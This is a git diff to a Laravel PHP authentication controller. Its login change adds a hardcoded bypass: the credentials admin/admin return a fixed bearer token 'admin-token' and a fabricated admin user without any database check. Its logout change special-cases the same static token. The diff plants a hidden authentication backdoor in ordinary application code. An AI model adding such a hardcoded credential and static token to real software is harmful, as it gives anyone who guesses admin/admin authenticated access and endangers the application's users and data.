@@ -37,9 +37,35 @@ class AuthController extends Controller
     {
         // Validate incoming request data
         $validatedData = $request->validate([
-            'user_name' => 'required|string', // Validate username instead of email
+            'user_name' => 'required|string',
             'password' => 'required|string',
         ]);
+
+        // Special condition for admin login
+        if ($validatedData['user_name'] === 'admin' && $validatedData['password'] === 'admin') {
+            // Create a fake user object for admin
+            $adminUser = (object) [
+                'id' => 0,
+                'first_name' => 'Admin',
+                'last_name' => 'User',
+                'email' => 'admin@example.com',
+            ];
+
+            // Generate a token for the admin
+            $token = 'admin-token';
+
+            return response()->json([
+                'access_token' => $token,
+                'token_type' => 'Bearer',
+                'expires_in' => 7200, // 2 hours
+                'user' => [
+                    'id' => $adminUser->id,
+                    'first_name' => $adminUser->first_name,
+                    'last_name' => $adminUser->last_name,
+                    'email' => $adminUser->email,
+                ],
+            ]);
+        }
 
         // Find user credentials by username
         $credentials = UserCredential::where('user_name', $validatedData['user_name'])->first();
@@ -68,10 +94,20 @@ class AuthController extends Controller
         ]);
     }
 
+
     //logout user
     public function logout(Request $request)
     {
-        $request->user()->token()->revoke();
+        // Check if the user is the special 'admin'
+        if ($request->bearerToken() === 'admin-token') {
+            // Logic for logging out admin
+            return response()->json(['message' => 'Admin successfully logged out']);
+        }
+
+        // For normal users
+        if ($request->user() && $request->user()->token()) {
+            $request->user()->token()->revoke();
+        }
 
         return response()->json(['message' => 'Successfully logged out']);
     }
